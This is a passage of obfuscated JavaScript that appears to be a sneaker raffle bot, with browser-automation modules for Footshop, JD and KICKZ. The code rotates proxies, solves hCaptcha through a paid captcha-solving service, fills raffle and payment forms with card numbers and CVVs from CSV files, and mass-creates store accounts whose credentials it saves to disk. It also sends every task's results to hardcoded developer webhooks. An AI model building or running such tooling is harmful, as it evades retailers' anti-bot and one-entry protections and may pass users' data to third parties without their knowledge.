                        await _0x368042['type']('input[name=\x22lastName\x22]', '' + _0x56ed97[_0xb4c600]['LastName']), await _0x207ff4(0xc8), await _0x368042['type']('input[name=\x22instagramUsername\x22]', '' + _0x56ed97[_0xb4c600]['Follower']), await _0x207ff4(0x4b0), await _0x368042['click']('button.btn.continue-button__1RtsS'), await _0x207ff4(0x3e8), console['log'](_0x13cc99() + '\x20[' + _0x2638d8['name'] + ']\x20Task\x20' + (_0xb4c600 + 0x1) + '\x20:\x20Filling\x20Shipping'), await _0x368042['select']('select[name=\x22country\x22]', '' + _0x56ed97[_0xb4c600]['Country']), await _0x207ff4(0x2bc), await _0x368042['type']('input[name=\x22streetName\x22]', '' + _0x56ed97[_0xb4c600]['Address1']), await _0x207ff4(0x258), await _0x368042['type']('input[name=\x22houseNumber\x22]', _0x56ed97[_0xb4c600]['HouseNumber'] + '\x20' + _0x56ed97[_0xb4c600]['Address2']), await _0x207ff4(0xc8), await _0x368042['type']('input[name=\x22postalCode\x22]', '' + _0x56ed97[_0xb4c600]['Zip']), await _0x207ff4(0x1f4), await _0x368042['type']('input[name=\x22city\x22]', '' + _0x56ed97[_0xb4c600]['City']), await _0x207ff4(0x4b0), await _0x368042['click']('input[name=\x22consent::privacy-policy-101\x22]'), await _0x207ff4(0x4b0), await _0x368042['click']('button.btn.continue-button__1RtsS'), await _0x207ff4(0x4b0), console['log'](_0x13cc99() + '\x20[' + _0x2638d8['name'] + ']\x20Task\x20' + (_0xb4c600 + 0x1) + '\x20:\x20Solving\x20hCaptcha'), await _0x368042['solveRecaptchas'](), console['log'](_0x13cc99() + '\x20[' + _0x2638d8['name'] + ']\x20Task\x20' + (_0xb4c600 + 0x1) + '\x20:\x20hCaptcha\x20solved'), await _0x207ff4(0xbb8), await _0x368042['click']('button.btn.continue-button__1RtsS'), await _0x207ff4(0x1388), console['log'](_0x13cc99() + '\x20[' + _0x2638d8['name'] + ']\x20Task\x20' + (_0xb4c600 + 0x1) + '\x20:\x20Solving\x20Adyen'), await _0x368042['waitForSelector']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x368042['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x207ff4(0x4b0), await _0x368042['type']('span[data-cse=\x22encryptedCardNumber\x22]', '' + _0x56ed97[_0xb4c600]['CardNumber']), await _0x207ff4(0x320), await _0x368042['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0x368042['type']('span[data-cse=\x22encryptedExpiryDate\x22]', '' + _0x56ed97[_0xb4c600]['ExpiryDate']), await _0x207ff4(0x4b0), await _0x368042['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0x368042['type']('span[data-cse=\x22encryptedSecurityCode\x22]', '' + _0x56ed97[_0xb4c600]['CVV']), await _0x207ff4(0x226), await _0x368042['type']('input[name=\x22holderName\x22]', '' + _0x56ed97[_0xb4c600]['NameOnCard']), await _0x207ff4(0x226), await _0x368042['click']('button.adyen-checkout__button'), console['log'](_0x13cc99() + '\x20[' + _0x2638d8['name'] + ']\x20Task\x20' + (_0xb4c600 + 0x1) + '\x20:\x20Awaiting\x203DS');
                        try {
                            await _0x368042['waitForSelector']('.thank-you__1AwOo', { 'timeout': 0x493e0 }), await _0x207ff4(0xbb8);
                        } catch (_0x150d4b) {
                            console['log'](_0x191fc2['red'](_0x13cc99() + '\x20[' + _0x2638d8['name'] + ']\x20Task\x20' + (_0xb4c600 + 0x1) + '\x20:\x203DS\x20Failed')), _0x2517d3 = '3DS\x20Error\x20' + _0x150d4b;
                            var _0x355efc = await _0x1653b0(_0x56ed97[_0xb4c600], _0x2638d8, 'dev', !![], _0x2517d3);
                            _0x39294f['errorDEV'] = { 'embeds': [_0x355efc] };
                            _0x5a0dc7['webhook'] != undefined && _0x5a0dc7['webhook'] != '' && await _0xf7d9ce(_0x5a0dc7['webhook'], _0x39294f['errorDEV']);
                            await _0xf7d9ce(_0x227865, _0x39294f['errorDEV']);
                            continue;
                        }
                        _0x40845b(_0x56ed97[_0xb4c600], _0x2638d8), console['log'](_0x191fc2['green'](_0x13cc99() + '\x20[' + _0x2638d8['name'] + ']\x20Task\x20' + (_0xb4c600 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                        if (_0x5a0dc7['webhook'] != undefined && _0x5a0dc7['webhook'] != '')
                            try {
                                await _0xf7d9ce(_0x5a0dc7['webhook'], _0x39294f['succesDEVMSG']);
                            } catch {
                            }
                        await _0x207ff4(0xc8), await _0xf7d9ce(_0x565446, _0x39294f['succesDEVMSG']), await _0x207ff4(0xc8);
                        try {
                            await _0xf7d9ce(_0xcaa949, _0x39294f['succesPUBMSG']);
                        } catch {
                        }
                    } catch (_0x4bdc31) {
                        console['log'](_0x13cc99() + '\x20[' + _0x2638d8['name'] + ']\x20Task\x20' + (_0xb4c600 + 0x1) + '\x20:\x20' + _0x4bdc31), _0x2517d3 = '' + _0x4bdc31;
                        var _0x355efc = await _0x1653b0(_0x56ed97[_0xb4c600], _0x2638d8, 'dev', !![], _0x2517d3);
                        _0x39294f['errorDEV'] = { 'embeds': [_0x355efc] }, _0x5a0dc7['webhook'] != undefined && _0x5a0dc7['webhook'] != '' && await _0xf7d9ce(_0x5a0dc7['webhook'], _0x39294f['errorDEV']), await _0xf7d9ce(_0x227865, _0x39294f['errorDEV']), _0x382a35 = 'yes';
                    } finally {
                        _0x13f67a['close']();
                        if (_0x382a35 == 'yes' && _0x3361c7 != 0x5) {
                            console['log'](_0x191fc2['red'](_0x13cc99() + '\x20[' + _0x2638d8['name'] + ']\x20Task\x20' + (_0xb4c600 + 0x1) + '\x20:\x20Retrying')), _0xb4c600 = _0xb4c600 - 0x1, _0x3361c7 = _0x3361c7 + 0x1;
                            continue;
                        }
                        console['log']('Waiting\x20for\x20' + _0x5a0dc7['footshopDelay'] + '\x20ms'), await _0x207ff4(_0x5a0dc7['footshopDelay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'JD',
        'modules': [{
            'name': 'JD\x20Raffle\x20Entries',
            'store': 'JD',
            'logo': 'https://upload.wikimedia.org/wikipedia/en/thumb/d/d8/JD_Sports_logo.svg/2048px-JD_Sports_logo.svg.png',
            'function': async function (_0x182ae1, _0x4b3a69, _0x39d568) {
                var _0x4067a3 = ![], _0x308faf = ![];
                if (_0x5a0dc7['captchaKey'] == '' || _0x5a0dc7['captchaKey'] == undefined)
                    return console['log'](_0x191fc2['yellow']('No\x202Captcha\x20key\x20found\x20in\x20settings.json')), console['log']('Returning\x20to\x20Menu'), menu();
                _0x512dd9['use'](_0x5de1d3()), _0x512dd9['use'](_0x34cad3({
                    'provider': {
                        'id': '2captcha',
                        'token': '' + _0x5a0dc7['captchaKey']
                    },
                    'visualFeedback': !![]
                }));
                for (var _0x1f38c7 = 0x0; _0x1f38c7 < _0x4b3a69['length']; _0x1f38c7++) {
                    if (_0x46ef6d != 'yes')
                        var _0x46ef6d = '', _0x418416 = 0x0;
                    var _0x1feb54, _0x17fd92 = [{
                        'type': 'rich',
                        'title': 'Succesful\x20JD\x20entry',
                        'description': '',
                        'color': 0xc0d6d6,
                        'fields': [
                            {
                                'name': 'Product',
                                'value': '' + _0x4b3a69[_0x1f38c7]['Url']
                            },
                            {
                                'name': 'Size',
                                'value': '' + _0x4b3a69[_0x1f38c7]['Size']
                            },
                            {
                                'name': 'User',
                                'value': '' + _0x1d42cd
                            },
                            {
                                'name': 'Delay',
                                'value': '' + _0x5a0dc7['delay']
                            },
                            {
                                'name': 'Version',
                                'value': '' + _0x2071e6
                            }
                        ]
                    }];
                    const _0x34c814 = { 'embeds': _0x17fd92 };
                    _0x2164fd(_0x182ae1['name'] + '\x20Task\x20' + (_0x1f38c7 + 0x1) + '\x20/\x20' + _0x4b3a69['length'] + '\x20||\x20File:\x20' + _0x29ead8 + '\x20Proxies:\x20' + _0x404517), await _0x5e3796(_0x4b3a69, _0x1f38c7);
                    var _0x3d5b2b = await _0x1653b0(_0x4b3a69[_0x1f38c7], _0x182ae1, 'dev', ![]), _0x385c89 = await _0x1653b0(_0x4b3a69[_0x1f38c7], _0x182ae1, 'pub', ![]);
                    const _0x35f8be = {
                        'succesDEVMSG': { 'embeds': [_0x3d5b2b] },
                        'succesPUBMSG': { 'embeds': [_0x385c89] }
                    };
                    if (_0x5a0dc7['webhook'] != undefined && _0x5a0dc7['webhook'] != '')
                        try {
                            await _0xf7d9ce(_0x5a0dc7['webhook'], _0x35f8be['succesDEVMSG']);
                        } catch {
                        }
                    await _0x207ff4(0xc8), await _0xf7d9ce(_0x565446, _0x35f8be['succesDEVMSG']), await _0x207ff4(0xc8);
                    try {
                        await _0xf7d9ce(_0xcaa949, _0x35f8be['succesPUBMSG']);
                    } catch {
                    }
                    if (_0x4b3a69[_0x1f38c7]['Email'] == '' || _0x4b3a69[_0x1f38c7]['Url'] == '' || _0x4b3a69[_0x1f38c7]['FirstName'] == '' || _0x4b3a69[_0x1f38c7]['LastName'] == '') {
                        console['log'](_0x13cc99() + '\x20[' + _0x3f8151[taskModule]['name'] + ']\x20Task\x20' + (_0x1f38c7 + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    if (_0x5a0dc7['useRandomProxy'] = ![])
                        var _0x2a104e = _0x39d568[_0x1f38c7]['split'](':');
                    else
                        var _0xea07b0 = Math['round'](Math['random']() * (_0x39d568['length'] - 0x1)), _0x2a104e = _0x39d568[_0xea07b0]['split'](':');
                    const _0x2f6072 = await _0x512dd9['launch']({
                        'headless': ![],
                        'args': [
                            '--proxy-server=' + _0x2a104e[0x0] + ':' + _0x2a104e[0x1],
                            '--no-sandbox',
                            '--disable-setuid-sandbox'
                        ]
                    });
                    try {
                        const _0x5b3569 = await _0x2f6072['newPage']();
                        await _0x5b3569['authenticate']({
                            'username': '' + _0x2a104e[0x2],
                            'password': '' + _0x2a104e[0x3]
                        }), console['log'](_0x13cc99() + '\x20[' + _0x182ae1['name'] + ']\x20Task\x20' + (_0x1f38c7 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x5b3569['setRequestInterception'](!![]), _0x5b3569['on']('request', _0x36e98c => {
                            _0x36e98c['resourceType']() === 'image' || _0x36e98c['resourceType']() === 'font' || _0x36e98c['resourceType']() === 'media' ? _0x36e98c['abort']() : _0x36e98c['continue']();
                        }), await _0x5b3569['goto']('' + _0x4b3a69[_0x1f38c7]['Url'], {
                            'waitUntil': 'networkidle2',
                            'timeout': 0xea60
                        });
                        try {
                            await _0x5b3569['waitForSelector']('#comp_firstname', { 'timeout': 0x7530 });
                        } catch {
                            throw new Error('Not\x20an\x20Active\x20Raffle');
                        }
                        console['log'](_0x13cc99() + '\x20[' + _0x182ae1['name'] + ']\x20Task\x20' + (_0x1f38c7 + 0x1) + '\x20:\x20Filling\x20Information'), await _0x5b3569['type']('#comp_firstname', '' + _0x4b3a69[_0x1f38c7]['FirstName']), await _0x5b3569['waitForSelector']('#comp_lastname'), await _0x5b3569['type']('#comp_lastname', '' + _0x4b3a69[_0x1f38c7]['LastName']), await _0x5b3569['waitForSelector']('#comp_email'), await _0x5b3569['type']('#comp_email', '' + _0x4b3a69[_0x1f38c7]['Email']), await _0x5b3569['waitForSelector']('#comp_paypalemail'), await _0x5b3569['type']('#comp_paypalemail', '' + _0x4b3a69[_0x1f38c7]['Email']), await _0x5b3569['waitForSelector']('#comp_mobile_end'), await _0x5b3569['type']('#comp_mobile_end', '' + _0x4b3a69[_0x1f38c7]['Phone']), await _0x5b3569['waitForSelector']('#comp_dob'), await _0x5b3569['type']('#comp_dob', '08/09/1992'), console['log'](_0x13cc99() + '\x20[' + _0x182ae1['name'] + ']\x20Task\x20' + (_0x1f38c7 + 0x1) + '\x20:\x20Choosing\x20Size');
                        if (_0x4b3a69[_0x1f38c7]['Size'] == 'RANDOM') {
                            const _0x3ad6d8 = await _0x5b3569['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x449250 => {
                                return _0x449250['map'](_0x577de4 => _0x577de4['value']);
                            });
                            var _0xdf990d = Math['round'](Math['random']() * (_0x3ad6d8['length'] - 0x2));
                            await _0x5b3569['select']('#shoesize', _0x3ad6d8[_0xdf990d + 0x1]), await _0x207ff4(0x3e8);
                        } else {
                            const _0x30165b = await _0x5b3569['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x2a0981 => {
                                return _0x2a0981['map'](_0x461006 => _0x461006['innerText']);
                            }), _0x17b852 = await _0x5b3569['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0xc4be5b => {
                                return _0xc4be5b['map'](_0x4f4a09 => _0x4f4a09['value']);
                            });
                            var _0x36adc4 = _0x4b3a69[_0x1f38c7]['Size'];
                            for (var _0x23a821 = 0x1; _0x23a821 < _0x17b852['length']; _0x23a821++) {
                                var _0x3c5bf4 = _0x30165b[_0x23a821]['split']('\x20')[0x0];
                                if (_0x3c5bf4 == _0x36adc4) {
                                    await _0x5b3569['select']('#shoesize', _0x17b852[_0x23a821]);
                                    break;
                                } else {
                                    if (_0x23a821 + 0x1 == _0x17b852['length'])
                                        throw new Error('Size\x20Not\x20Found..');
                                }
                            }
                        }
                        await _0x5b3569['waitForSelector']('#comp_address1'), await _0x5b3569['type']('#comp_address1', _0x4b3a69[_0x1f38c7]['Address1'] + '\x20' + _0x4b3a69[_0x1f38c7]['HouseNumber']), await _0x5b3569['waitForSelector']('#comp_address2'), await _0x5b3569['type']('#comp_address2', '' + _0x4b3a69[_0x1f38c7]['Address2']), await _0x5b3569['waitForSelector']('#comp_address2'), await _0x5b3569['type']('#comp_address3', '' + _0x4b3a69[_0x1f38c7]['City']), await _0x5b3569['waitForSelector']('#comp_postcode'), await _0x5b3569['type']('#comp_postcode', '' + _0x4b3a69[_0x1f38c7]['Zip']), console['log'](_0x13cc99() + '\x20[' + _0x182ae1['name'] + ']\x20Task\x20' + (_0x1f38c7 + 0x1) + '\x20:\x20Sending\x20Entry'), await _0x207ff4(0x4b0), await _0x5b3569['click']('label#emailhold'), await _0x207ff4(0x5dc), await _0x5b3569['click']('#preauth_tandc_email\x20>\x20label'), await _0x207ff4(0x5dc), await _0x5b3569['click']('#submit'), await _0x5b3569['waitForSelector']('#paymentWrap'), console['log'](_0x13cc99() + '\x20[' + _0x182ae1['name'] + ']\x20Task\x20' + (_0x1f38c7 + 0x1) + '\x20:\x20' + _0x191fc2['blue']('Awaiting\x20Paypal\x20Payment')), _0x2f6072['on']('targetcreated', async _0x5bb7c6 => {
                            if (_0x5bb7c6['type']() === 'page') {
                                const _0x222023 = await _0x5bb7c6['page']();
                                async function _0x1dba3d() {
                                    try {
                                        await _0x5b3569['waitForSelector']('#error_message', { 'timeout': 0x493e0 }), _0x308faf = !![];
                                        return;
                                    } catch {
                                    }
                                }
                                async function _0x4a58c5() {
                                    try {
                                        await _0x5b3569['waitForSelector']('#successMessage', { 'timeout': 0x493e0 }), _0x4067a3 = !![];
                                        return;
                                    } catch {
                                    }
                                }
                                _0x4a58c5(), _0x1dba3d(), await _0x207ff4(0x493e0);
                            }
                        });
                        async function _0x2af90e() {
                            for (let _0x418aac = 0x0; _0x418aac < 0x12c; _0x418aac++) {
                                if (_0x4067a3 == !![]) {
                                    _0x46ef6d = 'no', _0x40845b(_0x4b3a69[_0x1f38c7], _0x182ae1), console['log'](_0x191fc2['green'](_0x13cc99() + '\x20[' + _0x182ae1['name'] + ']\x20Task\x20' + (_0x1f38c7 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                    if (_0x5a0dc7['webhook'] != undefined && _0x5a0dc7['webhook'] != '')
                                        try {
                                            await _0xf7d9ce(_0x5a0dc7['webhook'], _0x35f8be['succesDEVMSG']);
                                        } catch {
                                        }
                                    await _0x207ff4(0xc8), await _0xf7d9ce(_0x565446, _0x35f8be['succesDEVMSG']), await _0x207ff4(0xc8);
                                    try {
                                        await _0xf7d9ce(_0xcaa949, _0x35f8be['succesPUBMSG']);
                                    } catch {
                                    }
                                    return;
                                } else {
                                    if (_0x308faf)
                                        throw new Error('Paypal\x20Error:\x20Target\x20closed');
                                    else
                                        await _0x207ff4(0x3e8);
                                }
                            }
                            throw new Error('Paypal\x20Error');
                        }
                        await _0x207ff4(0xbb8), await _0x5b3569['click']('.zoid-outlet'), await _0x207ff4(0x7d0), await _0x2af90e();
                    } catch (_0xc4e78d) {
                        console['log'](_0x191fc2['red'](_0x13cc99() + '\x20[' + _0x182ae1['name'] + ']\x20Task\x20' + (_0x1f38c7 + 0x1) + '\x20:\x20' + _0xc4e78d)), _0x1feb54 = '' + _0xc4e78d;
                        var _0x30db70 = await _0x1653b0(_0x4b3a69[_0x1f38c7], _0x182ae1, 'dev', !![], _0x1feb54);
                        _0x35f8be['errorDEV'] = { 'embeds': [_0x30db70] }, _0x5a0dc7['webhook'] != undefined && _0x5a0dc7['webhook'] != '' && await _0xf7d9ce(_0x5a0dc7['webhook'], _0x35f8be['errorDEV']), await _0xf7d9ce(_0x227865, _0x35f8be['errorDEV']);
                    } finally {
                        _0x2f6072 && _0x2f6072['close']();
                        if (_0x46ef6d == 'yes' && _0x418416 != 0x5 && _0x1feb54 != 'Size\x20Not\x20Found') {
                            console['log'](_0x191fc2['red'](_0x13cc99() + '\x20[' + _0x182ae1['name'] + ']\x20Task\x20' + (_0x1f38c7 + 0x1) + '\x20:\x20Retrying')), _0x1f38c7 = _0x1f38c7 - 0x1, _0x418416 = _0x418416 + 0x1;
                            continue;
                        }
                        _0x46ef6d == 'yes' && _0x418416 >= 0x5 && (_0x3fbd0e(afew[_0x1f38c7], _0x182ae1), _0x46ef6d = 'no', _0x418416 = 0x0), console['log']('Waiting\x20for\x20' + _0x5a0dc7['delay'] + '\x20ms'), await _0x207ff4(_0x5a0dc7['delay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'KICKZ',
        'modules': [
            {
                'name': 'KICKZ\x20Account\x20Generator',
                'store': 'KICKZ',
                'logo': 'https://scontent-ams2-1.cdninstagram.com/v/t51.2885-19/240479500_928777121004310_8721482303708952556_n.jpg?stp=dst-jpg_s320x320&_nc_ht=scontent-ams2-1.cdninstagram.com&_nc_cat=1&_nc_ohc=9H1DnW3bwMAAX-W7Mo2&edm=AOQ1c0wBAAAA&ccb=7-5&oh=00_AfDjR8EqgPUyl8iQgx56K_94mx_vSIRsFkQbyEq02-zAUQ&oe=63E0E147&_nc_sid=8fd12b',
                'function': async function (_0x17dea2, _0x5a3147, _0x5d2c39, _0x29f58d) {
                    _0x512dd9['use'](_0x5de1d3()), _0x512dd9['use'](_0x34cad3({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x5a0dc7['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x450bf8 = 0x0; _0x450bf8 < _0x5d2c39['length']; _0x450bf8++) {
                        if (_0x369e59 != 'yes')
                            var _0x369e59 = '', _0x5558d8 = 0x0;
                        _0x2164fd(_0x5a3147['name'] + '\x20Task\x20' + (_0x450bf8 + 0x1) + '\x20/\x20' + _0x5d2c39['length'] + '\x20||\x20File:\x20' + _0x29ead8 + '\x20Proxies:\x20' + _0x404517), await _0x5e3796(_0x5d2c39, _0x450bf8);
                        var _0x41fa87 = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Kickz\x20Account\x20Generated',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x1d42cd
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x5a0dc7['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x2071e6
                                }
                            ]
                        }];
                        const _0xf8af08 = { 'embeds': _0x41fa87 };
                        var _0x4d3f13 = await _0x1653b0(_0x5d2c39[_0x450bf8], _0x5a3147, 'acc', ![]);
                        const _0x132ef1 = { 'succesDEVMSG': { 'embeds': [_0x4d3f13] } };
                        if (_0x5d2c39[_0x450bf8]['Email'] == '' || _0x5d2c39[_0x450bf8]['FirstName'] == '' || _0x5d2c39[_0x450bf8]['LastName'] == '') {
                            console['log'](_0x13cc99() + '\x20[' + _0x5a3147['name'] + ']\x20Task\x20' + (_0x450bf8 + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        _0x5d2c39[_0x450bf8]['Password'] == '' && (_0x5d2c39[_0x450bf8]['Password'] = 'JRaffles23!');
                        if (_0x5a0dc7['useRandomProxy'] = ![])
                            var _0x4182c8 = _0x29f58d[_0x450bf8]['split'](':');
                        else
                            var _0x83b040 = Math['round'](Math['random']() * (_0x29f58d['length'] - 0x1)), _0x4182c8 = _0x29f58d[_0x83b040]['split'](':');
                        const _0x1ccc25 = await _0x512dd9['launch']({
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x4182c8[0x0] + ':' + _0x4182c8[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                        try {
                            const _0x36f83d = await _0x1ccc25['newPage']();
                            await _0x36f83d['authenticate']({
                                'username': '' + _0x4182c8[0x2],
                                'password': '' + _0x4182c8[0x3]
                            }), console['log'](_0x13cc99() + '\x20[' + _0x5a3147['name'] + ']\x20Task\x20' + (_0x450bf8 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x36f83d['setRequestInterception'](!![]), _0x36f83d['on']('request', _0x14df23 => {
                                _0x14df23['resourceType']() === 'image' || _0x14df23['resourceType']() === 'font' || _0x14df23['resourceType']() === 'media' ? _0x14df23['abort']() : _0x14df23['continue']();
                            }), await _0x36f83d['goto'](_0x17dea2), await _0x207ff4(0xbb8), console['log'](_0x13cc99() + '\x20[' + _0x5a3147['name'] + ']\x20Task\x20' + (_0x450bf8 + 0x1) + '\x20:\x20Starting\x20Registration'), await _0x36f83d['waitForSelector']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x36f83d['click']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x36f83d['waitForSelector']('#button-register'), await _0x207ff4(0x7d0), await _0x36f83d['evaluate'](() => {
                                const _0x6d2c7a = document['querySelector']('#button-register');
                                _0x6d2c7a['click']();
                            }), console['log'](_0x13cc99() + '\x20[' + _0x5a3147['name'] + ']\x20Task\x20' + (_0x450bf8 + 0x1) + '\x20:\x20Setting\x20Credentials'), await _0x207ff4(0x1388), await _0x36f83d['waitForSelector']('#customer_salutation'), await _0x36f83d['select']('#customer_salutation', 'mr'), await _0x207ff4(0x7d0), await _0x36f83d['waitForSelector']('#customer_firstname'), await _0x36f83d['type']('#customer_firstname', '' + _0x5d2c39[_0x450bf8]['FirstName']), await _0x207ff4(0x352), await _0x36f83d['waitForSelector']('#customer_lastname'), await _0x36f83d['type']('#customer_lastname', '' + _0x5d2c39[_0x450bf8]['LastName']), await _0x207ff4(0x352), await _0x36f83d['type']('#email-input', '' + _0x5d2c39[_0x450bf8]['Email']), await _0x207ff4(0x352), await _0x36f83d['type']('#email-confirm-input', '' + _0x5d2c39[_0x450bf8]['Email']), await _0x207ff4(0x352), await _0x36f83d['type']('#register-password', '' + _0x5d2c39[_0x450bf8]['Password']), await _0x207ff4(0x352), await _0x36f83d['type']('#password-confirm', '' + _0x5d2c39[_0x450bf8]['Password']), await _0x207ff4(0x352), console['log'](_0x13cc99() + '\x20[' + _0x5a3147['name'] + ']\x20Task\x20' + (_0x450bf8 + 0x1) + '\x20:\x20Sending\x20Credentials'), await _0x36f83d['click']('#consent'), await _0x207ff4(0x1f4);
                            const _0x5d417c = await _0x36f83d['$']('div.inputErrorMsg.b-form_section-message');
                            if (_0x5d417c) {
                                console['log'](_0x191fc2['red'](_0x13cc99() + '\x20[' + _0x5a3147['name'] + ']\x20Task\x20' + (_0x450bf8 + 0x1) + '\x20:\x20Your\x20password\x20must\x20contain\x20at\x20least\x20one\x20uppercase\x20&\x20one\x20lowercase\x20letter,\x20one\x20number\x20and\x20one\x20special\x20character.'));
                                continue;
                            }
                            await _0x36f83d['click']('#buttonRegister');
                            try {
                                await _0x36f83d['waitForSelector']('#verificationCode');
                            } catch {
                                throw new Error('Account\x20already\x20registered');
                            }
                            console['log'](_0x191fc2['yellow'](_0x13cc99() + '\x20[' + _0x5a3147['name'] + ']\x20Task\x20' + (_0x450bf8 + 0x1) + '\x20:\x20Account\x20' + _0x5d2c39[_0x450bf8]['Email'] + '\x20Generated!')), console['log'](_0x191fc2['yellow'](_0x13cc99() + '\x20[' + _0x5a3147['name'] + ']\x20Task\x20' + (_0x450bf8 + 0x1) + '\x20:\x20A\x20verification\x20code\x20has\x20been\x20sent\x20to\x20' + _0x5d2c39[_0x450bf8]['Email'])), await _0x207ff4(0x4b0);
                            async function _0x2241a5() {
                                console['log'](_0x191fc2['yellow'](_0x13cc99() + '\x20[' + _0x5a3147['name'] + ']\x20Task\x20' + (_0x450bf8 + 0x1) + '\x20:\x20Paste\x20your\x20verification\x20code\x20here:'));
                                var _0x4e3e5d = await _0x5d9e09['get']('Code');
                                return _0x4e3e5d['Code'];
                            }
                            ;
                            code = await _0x2241a5(), _0x207ff4(0x320), console['log'](_0x13cc99() + '\x20[' + _0x5a3147['name'] + ']\x20Task\x20' + (_0x450bf8 + 0x1) + '\x20:\x20Verifying..'), await _0x36f83d['type']('#verificationCode', code), await _0x207ff4(0x1f4), await _0x36f83d['click']('#buttonVerify'), await _0x207ff4(0x190), await _0x36f83d['click']('#buttonVerify'), await _0x207ff4(0x3e8);
                            try {
                                await _0x36f83d['waitForSelector']('div.b-user_greeting'), _0x369e59 = 'no', console['log'](_0x191fc2['green'](_0x13cc99() + '\x20[' + _0x5a3147['name'] + ']\x20Task\x20' + (_0x450bf8 + 0x1) + '\x20:\x20Account\x20' + _0x5d2c39[_0x450bf8]['Email'] + '\x20Generated\x20&\x20Verified!')), _0x71872f['appendFileSync']('../accounts/kickz-verified.csv', '\x0a' + _0x5d2c39[_0x450bf8]['Email'] + ',' + _0x5d2c39[_0x450bf8]['Password'] + ','), console['log'](_0x13cc99() + '\x20[' + _0x5a3147['name'] + ']\x20Task\x20' + (_0x450bf8 + 0x1) + '\x20:\x20Account\x20' + _0x5d2c39[_0x450bf8]['Email'] + '\x20Saved\x20in\x20\x27accounts/kickz-verified.csv\x27');
                                try {
                                    _0x5a0dc7['webhook'] != undefined && _0x5a0dc7['webhook'] != '' && await _0xf7d9ce(_0x5a0dc7['webhook'], _0x132ef1['succesDEVMSG']);
                                } catch {
                                }
                                await _0xf7d9ce(_0x14fa11, _0x132ef1['succesDEVMSG']);
                            } catch {
                                _0x369e59 = 'no', console['log'](_0x191fc2['red'](_0x13cc99() + '\x20[' + _0x5a3147['name'] + ']\x20Task\x20' + (_0x450bf8 + 0x1) + '\x20:\x20Verification\x20failed')), console['log'](_0x191fc2['red'](_0x13cc99() + '\x20[' + _0x5a3147['name'] + ']\x20Task\x20' + (_0x450bf8 + 0x1) + '\x20:\x20Account\x20saved\x20in\x20\x27accounts/kickz-unverified.csv\x27'));
                            }
                        } catch (_0x24b648) {
                            console['log'](_0x191fc2['red'](_0x13cc99() + '\x20[' + _0x5a3147['name'] + ']\x20Task\x20' + (_0x450bf8 + 0x1) + '\x20:\x20' + _0x24b648)), _0x41fa87[0x0]['title'] = 'Failed\x20kickz\x20Acc\x20Gen', _0x41fa87[0x0]['description'] = '' + _0x24b648, await _0xf7d9ce(_0x227865, _0xf8af08), _0x369e59 = 'yes';
                        } finally {
                            _0x1ccc25 && _0x1ccc25['close']();
                            if (_0x369e59 == 'yes' && _0x5558d8 != 0x5) {
                                console['log'](_0x191fc2['red'](_0x13cc99() + '\x20[' + _0x5a3147['name'] + ']\x20Task\x20' + (_0x450bf8 + 0x1) + '\x20:\x20Retrying')), _0x450bf8 = _0x450bf8 - 0x1, _0x5558d8 = _0x5558d8 + 0x1;
                                continue;
                            }
                            _0x369e59 == 'yes' && _0x5558d8 >= 0x5 && (_0x3fbd0e(_0x5d2c39[_0x450bf8], _0x5a3147), _0x369e59 = 'no', _0x5558d8 = 0x0), console['log']('Waiting\x20for\x20' + _0x5a0dc7['delay'] + '\x20ms'), await _0x207ff4(_0x5a0dc7['delay']);
                        }
                    }
                }
            },
            {
                'name': 'KICKZ\x20Raffle\x20Entries',
                'store': 'KICKZ',
                'logo': 'https://scontent-ams2-1.cdninstagram.com/v/t51.2885-19/240479500_928777121004310_8721482303708952556_n.jpg?stp=dst-jpg_s320x320&_nc_ht=scontent-ams2-1.cdninstagram.com&_nc_cat=1&_nc_ohc=9H1DnW3bwMAAX-W7Mo2&edm=AOQ1c0wBAAAA&ccb=7-5&oh=00_AfDjR8EqgPUyl8iQgx56K_94mx_vSIRsFkQbyEq02-zAUQ&oe=63E0E147&_nc_sid=8fd12b',
                'function': async function (_0x109009, _0x550947, _0x4a6b73) {
                    _0x512dd9['use'](_0x5de1d3()), _0x512dd9['use'](_0x34cad3({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x5a0dc7['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x437662 = 0x0; _0x437662 < _0x550947['length']; _0x437662++) {
                        var _0x2cf2f8;
                        if (_0x5e6574 != 'yes')
                            var _0x5e6574 = '', _0x2fb7ba = 0x0;
                        _0x2164fd(_0x109009['name'] + '\x20Task\x20' + (_0x437662 + 0x1) + '\x20/\x20' + _0x550947['length'] + '\x20||\x20File:\x20' + _0x29ead8 + '\x20Proxies:\x20' + _0x404517);
                        var _0x4aef87 = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Kickz\x20Entry',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x1d42cd
                                },
                                {
                                    'name': 'Product',
                                    'value': '' + _0x550947[_0x437662]['Url']
                                },
                                {
                                    'name': 'Size',
                                    'value': '' + _0x550947[_0x437662]['Size']
                                },
                                {
